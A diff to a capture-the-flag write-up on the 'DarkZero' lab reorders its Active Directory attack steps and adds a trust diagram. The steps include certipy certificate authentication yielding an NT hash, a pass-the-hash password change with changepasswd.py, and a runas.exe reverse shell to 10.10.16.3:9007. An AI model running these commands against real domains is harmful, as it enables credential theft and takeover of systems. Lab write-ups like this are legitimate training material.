@@ -314,16 +314,9 @@ Authenticating with the certificate (fixing clock skew first):
 
 ```bash
 sudo ntpdate 172.16.20.2
-
-certipy auth -pfx cert.pfx -dc-ip 172.16.20.2
-# [*] Got hash for 'svc_sql@darkzero.ext': aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f
+2025-10-10 02:56:04.394829 (-0400) +25200.228734 +/- 0.193815 172.16.20.2 s2 no-leap
+CLOCK: time stepped by 25200.228734
 ```
-
-We now have the **NT hash** for `svc_sql`.
-
-### Step 3 — Change svc_sql Password
-
-Using the NT hash to change the password:
 
 ```bash
 certipy auth -pfx cert.pfx -dc-ip 172.16.20.2
@@ -340,6 +333,16 @@ File 'svc_sql.ccache' already exists. Overwrite? (y/n - saying no will save with
 [*] Wrote credential cache to 'svc_sql.ccache'
 [*] Trying to retrieve NT hash for 'svc_sql'
 [*] Got hash for 'svc_sql@darkzero.ext': aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f
+```
+
+We now have the **NT hash** for `svc_sql`.
+
+### Step 3 — Change svc_sql Password
+
+Using the NT hash to change the password:
+
+```bash
+
 ```
 ```bash
 changepasswd.py darkzero.ext/svc_sql@dc02.darkzero.ext -hashes :816ccb849956b531db139346751db65f -newpass "Pa@ssw0rd123"
@@ -401,7 +404,6 @@ Administrator's password on DC02 is now `Pa@ssw0rd123`.
 
 ```powershell
 ./runas.exe Administrator Pa@ssw0rd123 powershell.exe -r 10.10.16.3:9007
-./runas.exe Administrator Pa@ssw0rd123 powershell.exe -r 10.10.16.3:9007
 
 [+] Running in session 0 with process function CreateProcessWithTokenW()
 [+] Using Station\Desktop: Service-0x0-29894$\Default
@@ -431,7 +433,10 @@ c14d56637a9ef3e98e660187a4e59669
 
 ### Understanding the Trust
 
+![Darkzero trust pic](/assets/img/posts/darkzero/trust.png)
+
 The `darkzero.htb` and `darkzero.ext` forests share a **bidirectional cross-forest trust** with `TRUST_ATTRIBUTE_CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION`. This means full TGTs — not just referral tickets — can cross the forest boundary. If DC01's machine account TGT lands on DC02, we can use it to authenticate back to `darkzero.htb`.
+
 
 ### Step 1 — Monitor for Incoming TGTs with Rubeus
 
